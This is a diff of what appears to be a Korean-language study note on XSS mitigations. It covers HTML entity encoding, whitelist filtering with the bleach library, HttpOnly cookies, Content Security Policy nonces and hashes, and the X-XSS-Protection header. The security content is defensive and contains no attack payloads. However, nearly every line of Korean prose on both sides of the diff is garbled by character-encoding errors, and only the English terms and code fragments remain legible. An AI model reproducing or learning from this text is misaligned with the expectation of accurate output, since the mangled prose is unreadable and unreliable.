-ëŒ€í‘œì ì¸ ì˜ˆì‹œë¡œëŠ” ê²Œì‹œíŒ ì„œë¹„ìŠ¤ì—ì„œ ìž‘ì„±ëœ ê²Œì‹œë¬¼ë“¤ì„ ì¡°íšŒí•˜ëŠ” ê³¼ì •ì—ì„œ ì¡°íšŒí•˜ê¸° ìœ„í•´ ìž…ë ¥í•œ ë°ì´í„°ì— ì˜í•´ ë°œìƒí•˜ëŠ” ë°©ì‹ì´ ìžˆë‹¤. ì‚¬ìš©ìžê°€ ê²Œì‹œë¬¼ ì¡°íšŒë¥¼ ìš”ì²­í•˜ë©´ ì„œë²„ëŠ” í•´ë‹¹ ìš”ì²­ì— ëŒ€í•˜ì—¬ ì¡°íšŒ í•œ ê²°ê³¼ë¥¼ ì‘ë‹µì— ì¶œë ¥í•˜ë©°, íŽ¸ì˜ì„±ì„ ìœ„í•´ ì‚¬ìš©ìžê°€ ì¡°íšŒí•œ ë‚´ìš©ì„ ì‘ë‹µì— í¬í•¨ì‹œí‚¤ê¸°ë„ í•œë‹¤. ì´ ë•Œ ì›¹ë¸Œë¼ìš°ì €ì—ì„œ íŽ˜ì´ì§€ë¥¼ ì¶œë ¥ ì‹œ ë°˜ì˜(Reflect)ë˜ëŠ” ê²°ê³¼ë¡œ ì¸í•´ Reflected XSSë¡œ ì´ì–´ì§ˆ ìˆ˜ ìžˆë‹¤.
+´ëÇ¥ÀûÀÎ ¿¹½Ã·Î´Â °Ô½ÃÆÇ ¼­ºñ½º¿¡¼­ ÀÛ¼ºµÈ °Ô½Ã¹°µéÀ» Á¶È¸ÇÏ´Â °úÁ¤¿¡¼­ Á¶È¸ÇÏ±â À§ÇØ ÀÔ·ÂÇÑ µ¥ÀÌÅÍ¿¡ ÀÇÇØ ¹ß»ýÇÏ´Â ¹æ½ÄÀÌ ÀÖ´Ù. »ç¿ëÀÚ°¡ °Ô½Ã¹° Á¶È¸¸¦ ¿äÃ»ÇÏ¸é ¼­¹ö´Â ÇØ´ç ¿äÃ»¿¡ ´ëÇÏ¿© Á¶È¸ ÇÑ °á°ú¸¦ ÀÀ´ä¿¡ Ãâ·ÂÇÏ¸ç, ÆíÀÇ¼ºÀ» À§ÇØ »ç¿ëÀÚ°¡ Á¶È¸ÇÑ ³»¿ëÀ» ÀÀ´ä¿¡ Æ÷ÇÔ½ÃÅ°±âµµ ÇÑ´Ù. ÀÌ ¶§ À¥ºê¶ó¿ìÀú¿¡¼­ ÆäÀÌÁö¸¦ Ãâ·Â ½Ã ¹Ý¿µ(Reflect)µÇ´Â °á°ú·Î ÀÎÇØ Reflected XSS·Î ÀÌ¾îÁú ¼ö ÀÖ´Ù.
 </p>
 
 <h3>Mitigations</h3>
-<p>XSSëŠ” ì›¹ ì„œë¹„ìŠ¤ìƒì—ì„œ ë¹ˆë²ˆí•˜ê²Œ ì¼ì–´ë‚˜ëŠ” ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì´ë©° ì´ë¥¼ ë°©ì–´í•˜ëŠ” ë§Žì€ ë°©ë²•ë“¤ì´ ì¡´ìž¬í•œë‹¤.</p>
+<p>XSS´Â À¥ ¼­ºñ½º»ó¿¡¼­ ºó¹øÇÏ°Ô ÀÏ¾î³ª´Â Ãë¾àÁ¡ Áß ÇÏ³ªÀÌ¸ç ÀÌ¸¦ ¹æ¾îÇÏ´Â ¸¹Àº ¹æ¹ýµéÀÌ Á¸ÀçÇÑ´Ù.</p>
 <p>
-ë¸Œë¼ìš°ì € ë‹¨ì—ì„œ ë°©ì–´í•˜ëŠ” ê¸°ìˆ ë¿ë§Œ ì•„ë‹ˆë¼ ì„œë²„ ë‚´ë¶€ì— ì €ìž¥í•˜ëŠ” ì‹œì  í˜¹ì€ ì €ìž¥ëœ ë°ì´í„°ë¥¼ êº¼ë‚´ì™€ ì¶œë ¥í•˜ëŠ” ì‹œì ì— ìž…ë ¥ê°’ì„ ì˜¬ë°”ë¥´ê²Œ ê°€ê³µí•˜ëŠ” ë°©ì‹ìœ¼ë¡œ XSSë¥¼ ë°©ì–´í•´ì•¼ í•œë‹¤.
+ºê¶ó¿ìÀú ´Ü¿¡¼­ ¹æ¾îÇÏ´Â ±â¼ú»Ó¸¸ ¾Æ´Ï¶ó ¼­¹ö ³»ºÎ¿¡ ÀúÀåÇÏ´Â ½ÃÁ¡ È¤Àº ÀúÀåµÈ µ¥ÀÌÅÍ¸¦ ²¨³»¿Í Ãâ·ÂÇÏ´Â ½ÃÁ¡¿¡ ÀÔ·Â°ªÀ» ¿Ã¹Ù¸£°Ô °¡°øÇÏ´Â ¹æ½ÄÀ¸·Î XSS¸¦ ¹æ¾îÇØ¾ß ÇÑ´Ù.
 </p>
 
 - Server-side Mitigations
 
-- HTTPOnly í”Œëž˜ê·¸ ì‚¬ìš©
+- HTTPOnly ÇÃ·¡±× »ç¿ë
 
-- Content Security Policy ì‚¬ìš©
+- Content Security Policy »ç¿ë
 
 - X-XSS-Protection
 
 <h3>Server-side Mitigations</h3>
-<p>XSSë¥¼ ìœ ë°œí•  ìˆ˜ ìžˆëŠ” íƒœê·¸ ì‚½ìž…ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì„œë²„ ë‹¨ì—ì„œ ê²€ì¦í•˜ëŠ” ë°©ë²•
+<p>XSS¸¦ À¯¹ßÇÒ ¼ö ÀÖ´Â ÅÂ±× »ðÀÔÀ» ¹æÁöÇÏ±â À§ÇØ ¼­¹ö ´Ü¿¡¼­ °ËÁõÇÏ´Â ¹æ¹ý
 </p>
 <p>
-ì‚¬ìš©ìž ì¸í’‹ì´ HTML í˜•íƒœë¥¼ ì§€ì›í•  í•„ìš”ê°€ ì—†ì–´ HTML íƒœê·¸ê°€ ìž…ë ¥ë  ì¼ì´ ì—†ë‹¤ë©´ êº½ì‡  (<, >), ë”°ì˜´í‘œ(", ')ì™€ ê°™ì€ íŠ¹ìˆ˜ ë¬¸ìžë¥¼ HTML Entity Encodingì„ ì´ìš©í•´ íƒœê·¸ë¡œì¨ ì¸ì‹ì´ ì•ˆë˜ë„ë¡ í•œë‹¤.
+»ç¿ëÀÚ ÀÎÇ²ÀÌ HTML ÇüÅÂ¸¦ Áö¿øÇÒ ÇÊ¿ä°¡ ¾ø¾î HTML ÅÂ±×°¡ ÀÔ·ÂµÉ ÀÏÀÌ ¾ø´Ù¸é ²©¼è (<, >), µû¿ÈÇ¥(", ')¿Í °°Àº Æ¯¼ö ¹®ÀÚ¸¦ HTML Entity EncodingÀ» ÀÌ¿ëÇØ ÅÂ±×·Î½á ÀÎ½ÄÀÌ ¾ÈµÇµµ·Ï ÇÑ´Ù.
 </p>
 <p>
-ë§Œì•½ ì‚¬ìš©ìž ì¸í’‹ì— HTML í˜•íƒœë¥¼ ì§€ì›í•´ì•¼ í•œë‹¤ë©´ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ í•„í„°ë§ì„ í•´ì•¼í•œë‹¤.<br>
-í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ í•„í„°ë§ì´ëž€ í—ˆìš©í•´ë„ ì•ˆì „í•œ ì¼ë¶€ íƒœê·¸, ì†ì„±ì„ ì œì™¸í•œ ëª¨ë“  ê°’ì„ í•„í„°ë§, ê²Œì‹œê¸€ì„ ìš´ì˜í•˜ëŠ”ë° ìžˆì–´ì„œ img, video, a íƒœê·¸ë§Œ í•„ìš”í•˜ë‹¤ë©´ í•´ë‹¹ë˜ëŠ” ì„¸ ê°œì˜ íƒœê·¸ë¥¼ ì œì™¸í•œ ëª¨ë“  íƒœê·¸ëŠ” í•„í„°ë§ ì‹œí‚¤ëŠ” ë°©ì‹
+¸¸¾à »ç¿ëÀÚ ÀÎÇ²¿¡ HTML ÇüÅÂ¸¦ Áö¿øÇØ¾ß ÇÑ´Ù¸é È­ÀÌÆ®¸®½ºÆ® ÇÊÅÍ¸µÀ» ÇØ¾ßÇÑ´Ù.<br>
+È­ÀÌÆ®¸®½ºÆ® ÇÊÅÍ¸µÀÌ¶õ Çã¿ëÇØµµ ¾ÈÀüÇÑ ÀÏºÎ ÅÂ±×, ¼Ó¼ºÀ» Á¦¿ÜÇÑ ¸ðµç °ªÀ» ÇÊÅÍ¸µ, °Ô½Ã±ÛÀ» ¿î¿µÇÏ´Âµ¥ ÀÖ¾î¼­ img, video, a ÅÂ±×¸¸ ÇÊ¿äÇÏ´Ù¸é ÇØ´çµÇ´Â ¼¼ °³ÀÇ ÅÂ±×¸¦ Á¦¿ÜÇÑ ¸ðµç ÅÂ±×´Â ÇÊÅÍ¸µ ½ÃÅ°´Â ¹æ½Ä
 </p>
 
-ì‚¬ìš©ìž ì¸í’‹ì„ í•„í„°ë§ í•  ë•Œ ìœ ì˜í•  ì ì€ ìš”ì²­ì˜ URI Query ê°’ì´ë‚˜ POST Body ê°’ë§Œ í•„í„°ë§ í•  ê²ƒì´ ì•„ë‹ˆë¼ User-Agent, Refererì™€ ê°™ì€ í—¤ë”ë„ ëª¨ë‘ í¬í•¨í•˜ì—¬ ì‚¬ìš©ìžë¡œë¶€í„° ì˜¨ ê°’ì— ëª¨ë‘ ì ìš©í•´ì•¼ í•œë‹¤.
+»ç¿ëÀÚ ÀÎÇ²À» ÇÊÅÍ¸µ ÇÒ ¶§ À¯ÀÇÇÒ Á¡Àº ¿äÃ»ÀÇ URI Query °ªÀÌ³ª POST Body °ª¸¸ ÇÊÅÍ¸µ ÇÒ °ÍÀÌ ¾Æ´Ï¶ó User-Agent, Referer¿Í °°Àº Çì´õµµ ¸ðµÎ Æ÷ÇÔÇÏ¿© »ç¿ëÀÚ·ÎºÎÅÍ ¿Â °ª¿¡ ¸ðµÎ Àû¿ëÇØ¾ß ÇÑ´Ù.
 
-Mozilla ì—ì„œ ì œìž‘í•œ Bleach (https://github.com/mozilla/bleach) ë¼ëŠ” HTML í•„í„°ë§ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì¶”ì²œ
+Mozilla ¿¡¼­ Á¦ÀÛÇÑ Bleach (https://github.com/mozilla/bleach) ¶ó´Â HTML ÇÊÅÍ¸µ ¶óÀÌºê·¯¸®¸¦ ÃßÃµ
 
-ê·¸ ì™¸ì—ë„ ì‚¬ìš©ìžê°€ ë¡œê·¸ì¸í•  ë•Œ ì„¸ì…˜ì— ë¡œê·¸ì¸í•œ IPì£¼ì†Œë¥¼ í•¨ê»˜ ì €ìž¥í•˜ê³ , ì‚¬ìš©ìžê°€ íŽ˜ì´ì§€ë¥¼ ì ‘ì†í•  ë•Œë§ˆë‹¤ í˜„ìž¬ IPì£¼ì†Œì™€ ë¡œê·¸ì¸ í–ˆë˜ IPì£¼ì†Œê°€ ë™ì¼í•œì§€ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ëŠ” ë°©ë²•ì´ ìžˆë‹¤. ì´ ë°©ë²•ì€ ê³µê²©ìžê°€ ì„¸ì…˜ IDë¥¼ íƒˆì·¨í•´ë„ í¬ìƒìžì™€ IPì£¼ì†Œê°€ ë‹¬ë¼ í¬ìƒìžì˜ ì„¸ì…˜ì„ ì‚¬ìš©í•˜ì§€ ëª»í•˜ê²Œ í•˜ëŠ” ìž¥ì ì´ ìžˆì–´ ê³¼ê±°ì— ë„ë¦¬ ì“°ì˜€ë‹¤. ìµœê·¼ì—ëŠ” Mobile í™˜ê²½ì˜ ì‚¬ìš©ìžê°€ ì ì  ë§Žì•„ì§€ë©´ì„œ ì ‘ì†í•œ WiFiê°€ ë°”ë€” ë•Œë§ˆë‹¤ ì‚¬ìš©ìžì˜ IPì£¼ì†Œê°€ í•¨ê»˜ ë°”ë€ŒëŠ” ë¬¸ì œì  ë•Œë¬¸ì— ì ‘ì†í•œ IPê°€ ì•„ë‹Œ ì ‘ì†í•œ êµ­ê°€ê°€ ë³€ê²½ëœ ê²½ìš°ë¥¼ íƒì§€í•˜ëŠ” í˜•íƒœë¡œ ë°”ë€Œì—ˆë‹¤.
+±× ¿Ü¿¡µµ »ç¿ëÀÚ°¡ ·Î±×ÀÎÇÒ ¶§ ¼¼¼Ç¿¡ ·Î±×ÀÎÇÑ IPÁÖ¼Ò¸¦ ÇÔ²² ÀúÀåÇÏ°í, »ç¿ëÀÚ°¡ ÆäÀÌÁö¸¦ Á¢¼ÓÇÒ ¶§¸¶´Ù ÇöÀç IPÁÖ¼Ò¿Í ·Î±×ÀÎ Çß´ø IPÁÖ¼Ò°¡ µ¿ÀÏÇÑÁö ¿©ºÎ¸¦ È®ÀÎÇÏ´Â ¹æ¹ýÀÌ ÀÖ´Ù. ÀÌ ¹æ¹ýÀº °ø°ÝÀÚ°¡ ¼¼¼Ç ID¸¦ Å»ÃëÇØµµ Èñ»ýÀÚ¿Í IPÁÖ¼Ò°¡ ´Þ¶ó Èñ»ýÀÚÀÇ ¼¼¼ÇÀ» »ç¿ëÇÏÁö ¸øÇÏ°Ô ÇÏ´Â ÀåÁ¡ÀÌ ÀÖ¾î °ú°Å¿¡ ³Î¸® ¾²¿´´Ù. ÃÖ±Ù¿¡´Â Mobile È¯°æÀÇ »ç¿ëÀÚ°¡ Á¡Á¡ ¸¹¾ÆÁö¸é¼­ Á¢¼ÓÇÑ WiFi°¡ ¹Ù²ð ¶§¸¶´Ù »ç¿ëÀÚÀÇ IPÁÖ¼Ò°¡ ÇÔ²² ¹Ù²î´Â ¹®Á¦Á¡ ¶§¹®¿¡ Á¢¼ÓÇÑ IP°¡ ¾Æ´Ñ Á¢¼ÓÇÑ ±¹°¡°¡ º¯°æµÈ °æ¿ì¸¦ Å½ÁöÇÏ´Â ÇüÅÂ·Î ¹Ù²î¾ú´Ù.
 
 ```py
-# HTML Entity Encoding ì˜ˆì‹œ
+# HTML Entity Encoding ¿¹½Ã
 from jinja2 import utils
 @app.route('/board/', methods=['GET', 'POST'])
 def write():
@@ -163,7 +163,7 @@ def write():
         query = '...' % (...)
         ...
         return result
-# í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ í•„í„°ë§ ì˜ˆì‹œ
+# È­ÀÌÆ®¸®½ºÆ® ÇÊÅÍ¸µ ¿¹½Ã
 import bleach # https://github.com/mozilla/bleach
 @app.route('/board/', methods=['GET', 'POST'])
 def write():
@@ -183,23 +183,23 @@ def write():
 Set-Cookie: session=sbdh1vjwvq; HttpOnly
 ```
 
-HTTPOnly í”Œëž˜ê·¸ëŠ” ì„œë²„ ì¸¡ì—ì„œ ì‘ë‹µ í—¤ë”ì— Set-Cookie í—¤ë”ë¥¼ ì „ì†¡í•´ ì¿ í‚¤ë¥¼ ìƒì„±í•  ë•Œ ì˜µì…˜ìœ¼ë¡œ ì„¤ì • ê°€ëŠ¥í•˜ë©° ìžë°”ìŠ¤í¬ë¦½íŠ¸ì—ì„œ í•´ë‹¹ ì¿ í‚¤ì— ì ‘ê·¼ í•˜ëŠ” ê²ƒì„ ê¸ˆì§€í•œë‹¤. ì´ë¥¼ í™œìš©í•˜ë©´ XSS ì·¨ì•½ì ì´ ë°œìƒí•˜ë”ë¼ë„ ê³µê²©ìžê°€ ì•Œì•„ë‚¼ ìˆ˜ ì—†ëŠ” ì¿ í‚¤ ê°’ì´ê¸° ë•Œë¬¸ì— ì„¸ì…˜ì¿ í‚¤ë¥¼ ì„¤ì •í•  ë• HTTPOnly í”Œëž˜ê·¸ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì„ ì¶”ì²œ!
+HTTPOnly ÇÃ·¡±×´Â ¼­¹ö Ãø¿¡¼­ ÀÀ´ä Çì´õ¿¡ Set-Cookie Çì´õ¸¦ Àü¼ÛÇØ ÄíÅ°¸¦ »ý¼ºÇÒ ¶§ ¿É¼ÇÀ¸·Î ¼³Á¤ °¡´ÉÇÏ¸ç ÀÚ¹Ù½ºÅ©¸³Æ®¿¡¼­ ÇØ´ç ÄíÅ°¿¡ Á¢±Ù ÇÏ´Â °ÍÀ» ±ÝÁöÇÑ´Ù. ÀÌ¸¦ È°¿ëÇÏ¸é XSS Ãë¾àÁ¡ÀÌ ¹ß»ýÇÏ´õ¶óµµ °ø°ÝÀÚ°¡ ¾Ë¾Æ³¾ ¼ö ¾ø´Â ÄíÅ° °ªÀÌ±â ¶§¹®¿¡ ¼¼¼ÇÄíÅ°¸¦ ¼³Á¤ÇÒ ¶© HTTPOnly ÇÃ·¡±×¸¦ ¼³Á¤ÇÏ´Â °ÍÀ» ÃßÃµ!
 
 <h3>Content Security Policy (CSP)</h3>
 
-CSPëŠ” ì‘ë‹µ í—¤ë”ë‚˜ meta íƒœê·¸ë¥¼ í†µí•´ ì•„ëž˜ì™€ ê°™ì´ ì„ ì–¸í•´ì„œ ì‚¬ìš©í•  ìˆ˜ ìžˆê³ , ê°ê°ì˜ ì§€ì‹œì–´ë¥¼ ì ìš©í•˜ì—¬ ì‚¬ì´íŠ¸ì—ì„œ ë¡œë“œí•˜ëŠ” ë¦¬ì†ŒìŠ¤ë“¤ì˜ ì¶œì²˜ë¥¼ ì œí•œí•  ìˆ˜ ìžˆë‹¤.
+CSP´Â ÀÀ´ä Çì´õ³ª meta ÅÂ±×¸¦ ÅëÇØ ¾Æ·¡¿Í °°ÀÌ ¼±¾ðÇØ¼­ »ç¿ëÇÒ ¼ö ÀÖ°í, °¢°¢ÀÇ Áö½Ã¾î¸¦ Àû¿ëÇÏ¿© »çÀÌÆ®¿¡¼­ ·ÎµåÇÏ´Â ¸®¼Ò½ºµéÀÇ ÃâÃ³¸¦ Á¦ÇÑÇÒ ¼ö ÀÖ´Ù.
 
 ```html
-Content-Security-Policy: <ì§€ì‹œì–´>; ...
+Content-Security-Policy: <Áö½Ã¾î>; ...
 ```
 
-ì˜ˆë¥¼ ë“¤ì–´ default-src 'self' *.dreamhack.ioì™€ ê°™ì´ ì„¤ì •ëœ CSPëŠ” ëª¨ë“  ë¦¬ì†ŒìŠ¤(ì´ë¯¸ì§€ íŒŒì¼, ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ ë“±)ì˜ ì¶œì²˜ê°€ í˜„ìž¬ ë„ë©”ì¸ì´ê±°ë‚˜, *.dreamhack.ioë„ë©”ì¸ì´ ì¶œì²˜ì¼ ê²½ìš°ë§Œ í—ˆìš©í•œë‹¤. ë˜ script-srcë¥¼ ì„ ì–¸í•´ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œì˜ ì¶œì²˜ë¥¼ ì œí•œí•  ìˆ˜ ìžˆìœ¼ë©°, ê³µê²©ìžê°€ ì™¸ë¶€ì— ì—…ë¡œë“œëœ ìžë°”ìŠ¤í¬ë¦½íŠ¸ íŒŒì¼ì„ í˜¸ì¶œí•˜ê±°ë‚˜ ì§ì ‘ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ìž‘ì„±í•˜ëŠ” ë“±ì˜ í–‰ë™ì„ ë§‰ì„ ìˆ˜ ìžˆë‹¤. ì‹ ë¢°í•  ì¶œì²˜ë¥¼ ì„ ì–¸í•˜ëŠ” ë°©ì‹ì´ë‹ˆë§Œí¼ ì‹ ë¢°ë°›ëŠ” CDN ì„œë²„ê°€ í•´í‚¹ë‹¹í•˜ë©´ ë¬´ë ¥í™”ë˜ëŠ” ë‹¨ì ì´ ìžˆë‹¤.
+¿¹¸¦ µé¾î default-src 'self' *.dreamhack.io¿Í °°ÀÌ ¼³Á¤µÈ CSP´Â ¸ðµç ¸®¼Ò½º(ÀÌ¹ÌÁö ÆÄÀÏ, ½ºÅ©¸³Æ® ÆÄÀÏ µî)ÀÇ ÃâÃ³°¡ ÇöÀç µµ¸ÞÀÎÀÌ°Å³ª, *.dreamhack.ioµµ¸ÞÀÎÀÌ ÃâÃ³ÀÏ °æ¿ì¸¸ Çã¿ëÇÑ´Ù. ¶Ç script-src¸¦ ¼±¾ðÇØ ÀÚ¹Ù½ºÅ©¸³Æ® ÄÚµåÀÇ ÃâÃ³¸¦ Á¦ÇÑÇÒ ¼ö ÀÖÀ¸¸ç, °ø°ÝÀÚ°¡ ¿ÜºÎ¿¡ ¾÷·ÎµåµÈ ÀÚ¹Ù½ºÅ©¸³Æ® ÆÄÀÏÀ» È£ÃâÇÏ°Å³ª Á÷Á¢ ÀÚ¹Ù½ºÅ©¸³Æ® ÄÚµå¸¦ ÀÛ¼ºÇÏ´Â µîÀÇ Çàµ¿À» ¸·À» ¼ö ÀÖ´Ù. ½Å·ÚÇÒ ÃâÃ³¸¦ ¼±¾ðÇÏ´Â ¹æ½ÄÀÌ´Ï¸¸Å­ ½Å·Ú¹Þ´Â CDN ¼­¹ö°¡ ÇØÅ·´çÇÏ¸é ¹«·ÂÈ­µÇ´Â ´ÜÁ¡ÀÌ ÀÖ´Ù.
 
-ì´ ì™¸ì—ë„ ë§Žì€ ë¦¬ì†ŒìŠ¤ í˜•ì‹ (ì´ë¯¸ì§€, í°íŠ¸, ì˜¤ë¸Œì íŠ¸, ...) ì˜ ì¶œì²˜ë¥¼ ì œí•œí•  ìˆ˜ ìžˆëŠ” ì§€ì‹œì–´ë“¤ì´ ì¡´ìž¬í•˜ë©° script-src 'nonce-noncevalue13b739d8ea12' ì™€ ê°™ì´ script-srcë¥¼ ì´ìš©í•´ nonce (ëžœë¤) ê°’ì„ ì„¤ì •í•˜ê³  HTML íƒœê·¸ë¥¼ ì´ìš©í•´ ìžë°”ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ë•ŒëŠ” ë°˜ë“œì‹œ ì„œë²„ì—ì„œ ìƒì„±ëœ nonce ê°’ì„ ì•Œì•„ì•¼ë§Œ ì‹¤í–‰ë  ìˆ˜ ìžˆë„ë¡ í•  ìˆ˜ ìžˆë‹¤.
+ÀÌ ¿Ü¿¡µµ ¸¹Àº ¸®¼Ò½º Çü½Ä (ÀÌ¹ÌÁö, ÆùÆ®, ¿ÀºêÁ§Æ®, ...) ÀÇ ÃâÃ³¸¦ Á¦ÇÑÇÒ ¼ö ÀÖ´Â Áö½Ã¾îµéÀÌ Á¸ÀçÇÏ¸ç script-src 'nonce-noncevalue13b739d8ea12' ¿Í °°ÀÌ script-src¸¦ ÀÌ¿ëÇØ nonce (·£´ý) °ªÀ» ¼³Á¤ÇÏ°í HTML ÅÂ±×¸¦ ÀÌ¿ëÇØ ÀÚ¹Ù½ºÅ©¸³Æ®¸¦ ½ÇÇàÇÒ ¶§´Â ¹Ýµå½Ã ¼­¹ö¿¡¼­ »ý¼ºµÈ nonce °ªÀ» ¾Ë¾Æ¾ß¸¸ ½ÇÇàµÉ ¼ö ÀÖµµ·Ï ÇÒ ¼ö ÀÖ´Ù.
 
-ì¦‰, XSS ê³µê²©ì„ ë‹¹í•˜ë”ë¼ë„ ì„œë²„ì—ì„œ ë§¤ë²ˆ ìƒì„±ë˜ëŠ” nonce ê°’ì„ ìœ ì¶”í•  ìˆ˜ ì—†ë‹¤ë©´ ì¼ë°˜ì ì¸ ë°©ë²•ìœ¼ë¡œ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ì´ ë¶ˆê°€ëŠ¥í•´ì§„ë‹¤.
+Áï, XSS °ø°ÝÀ» ´çÇÏ´õ¶óµµ ¼­¹ö¿¡¼­ ¸Å¹ø »ý¼ºµÇ´Â nonce °ªÀ» À¯ÃßÇÒ ¼ö ¾ø´Ù¸é ÀÏ¹ÝÀûÀÎ ¹æ¹ýÀ¸·Î ÀÚ¹Ù½ºÅ©¸³Æ® ½ÇÇàÀÌ ºÒ°¡´ÉÇØÁø´Ù.
 
-ë˜í•œ script-src 'sha256-hashvalue_base64' ì™€ ê°™ì€ í˜•íƒœë¡œ ìžë°”ìŠ¤í¬ë¦½íŠ¸ë‚˜ ìŠ¤íƒ€ì¼ì‹œíŠ¸ì˜ í•´ì‹œë¥¼ êµ¬í•´ CSPë¥¼ ì„¤ì •í•´ì£¼ë©´ ë¯¸ë¦¬ êµ¬í•´ë‘” í•´ì‹œì™€ ë‹¤ë¥¼ ê²½ìš° ì‹¤í–‰í•˜ì§€ ì•Šë„ë¡ í•  ìˆ˜ ìžˆë‹¤.
+¶ÇÇÑ script-src 'sha256-hashvalue_base64' ¿Í °°Àº ÇüÅÂ·Î ÀÚ¹Ù½ºÅ©¸³Æ®³ª ½ºÅ¸ÀÏ½ÃÆ®ÀÇ ÇØ½Ã¸¦ ±¸ÇØ CSP¸¦ ¼³Á¤ÇØÁÖ¸é ¹Ì¸® ±¸ÇØµÐ ÇØ½Ã¿Í ´Ù¸¦ °æ¿ì ½ÇÇàÇÏÁö ¾Êµµ·Ï ÇÒ ¼ö ÀÖ´Ù.
 
 ```html
 <!doctype html>
@@ -213,16 +213,16 @@ Content-Security-Policy: <ì§€ì‹œì–´>; ...
 </html>
 ```
 
-ìœ„ ì½”ë“œëŠ” script íƒœê·¸ ì•ˆì˜ ìžë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œì˜ í•´ì‹œë¥¼ ë¯¸ë¦¬ êµ¬í•´ CSP ë¥¼ ì„¤ì •í•´ alert(1)ì„ ì„±ê³µì ìœ¼ë¡œ í˜¸ì¶œí•  ìˆ˜ ìžˆë„ë¡ í•œ ì˜ˆì‹œì´ë‹¤.
+À§ ÄÚµå´Â script ÅÂ±× ¾ÈÀÇ ÀÚ¹Ù½ºÅ©¸³Æ® ÄÚµåÀÇ ÇØ½Ã¸¦ ¹Ì¸® ±¸ÇØ CSP ¸¦ ¼³Á¤ÇØ alert(1)À» ¼º°øÀûÀ¸·Î È£ÃâÇÒ ¼ö ÀÖµµ·Ï ÇÑ ¿¹½ÃÀÌ´Ù.
 
 <h3>X-XSS-Protection Header</h3>
-X-XSS-Protectionì€ Response Headerì— ì•„ëž˜ì™€ ê°™ì´ ì„ ì–¸í•´ì„œ ì‚¬ìš©í•  ìˆ˜ ìžˆë‹¤.
+X-XSS-ProtectionÀº Response Header¿¡ ¾Æ·¡¿Í °°ÀÌ ¼±¾ðÇØ¼­ »ç¿ëÇÒ ¼ö ÀÖ´Ù.
 
 ```js
-X-XSS-Protection: <ê°’>
+X-XSS-Protection: <°ª>
 ```
 
-í•´ë‹¹ ì •ì±…ì€ ì›¹ ë¸Œë¼ìš°ì €ì— ë‚´ìž¥ëœ XSS Filterë¥¼ í™œì„±í™”í•  ê²ƒì¸ì§€ë¥¼ ì„¤ì •í•œë‹¤. XSS FilterëŠ” ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì „ì†¡ëœ Request ê°’ì´ XSS ê³µê²© ì½”ë“œì™€ ìœ ì‚¬í•˜ê²Œ ìƒê²¼ê³ , Responseì— í•´ë‹¹ ê³µê²© ì½”ë“œê°€ í¬í•¨ë˜ì—ˆì„ ê²½ìš°ì— XSS ê³µê²©ì´ ìˆ˜í–‰ë˜ì—ˆë‹¤ê³  íŒë‹¨í•˜ì—¬ XSS ê³µê²©ì´ ë°œìƒí–ˆìŒì„ ìœ ì €ì—ê²Œ ì•Œë¦¬ê³  ì°¨ë‹¨í•œë‹¤. Reflected XSS ê³µê²©ì„ ë§‰ëŠ” ë°ì— ì í•©í•œ ë°©ì–´ ë°©ë²•.
+ÇØ´ç Á¤Ã¥Àº À¥ ºê¶ó¿ìÀú¿¡ ³»ÀåµÈ XSS Filter¸¦ È°¼ºÈ­ÇÒ °ÍÀÎÁö¸¦ ¼³Á¤ÇÑ´Ù. XSS Filter´Â À¥ ºê¶ó¿ìÀú¿¡¼­ Àü¼ÛµÈ Request °ªÀÌ XSS °ø°Ý ÄÚµå¿Í À¯»çÇÏ°Ô »ý°å°í, Response¿¡ ÇØ´ç °ø°Ý ÄÚµå°¡ Æ÷ÇÔµÇ¾úÀ» °æ¿ì¿¡ XSS °ø°ÝÀÌ ¼öÇàµÇ¾ú´Ù°í ÆÇ´ÜÇÏ¿© XSS °ø°ÝÀÌ ¹ß»ýÇßÀ½À» À¯Àú¿¡°Ô ¾Ë¸®°í Â÷´ÜÇÑ´Ù. Reflected XSS °ø°ÝÀ» ¸·´Â µ¥¿¡ ÀûÇÕÇÑ ¹æ¾î ¹æ¹ý.
 
 ```js
 X-XSS-Protection: 0
@@ -231,11 +231,11 @@ X-XSS-Protection: 1; mode=block
 X-XSS-Protection: 1; report=<reporting-uri>
 ```
 
-í•´ë‹¹ Headerë¥¼ ì„ ì–¸í•˜ì§€ ì•Šì•˜ì„ ë•Œì˜ ë¸Œë¼ìš°ì € ê¸°ë³¸ ê°’ì€ 1ë¡œ, ê¸°ë³¸ìœ¼ë¡œ ìž‘ë™í•œë‹¤. 0ì¼ ê²½ìš° XSS Filterë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šìœ¼ë©°, 1ì¼ ê²½ìš° XSS ê³µê²©ì´ ê°ì§€ë˜ë©´ í•´ë‹¹ ë¶€ë¶„ë§Œ ì œê±°í•œ ë’¤ íŽ˜ì´ì§€ ê²°ê³¼ë¥¼ í™”ë©´ì— ì¶œë ¥í•œë‹¤. mode=blockì¼ ê²½ìš° XSS ê³µê²©ì´ ê°ì§€ë˜ë©´ íŽ˜ì´ì§€ ì „ì²´ì˜ ë Œë”ë§ì„ ì¤‘ë‹¨í•˜ê³ , reportë¥¼ ì„ ì–¸í•  ê²½ìš°ì— XSS ê³µê²©ì´ ê°ì§€ëœ ì‚¬ì‹¤ì„ ë¯¸ë¦¬ ì„¤ì •ëœ ì£¼ì†Œì— ì‹ ê³ í•˜ì—¬ ìš´ì˜ìžê°€ ëŒ€ì²˜í•˜ê¸° ì‰½ê²Œ í•  ìˆ˜ ìžˆë‹¤.
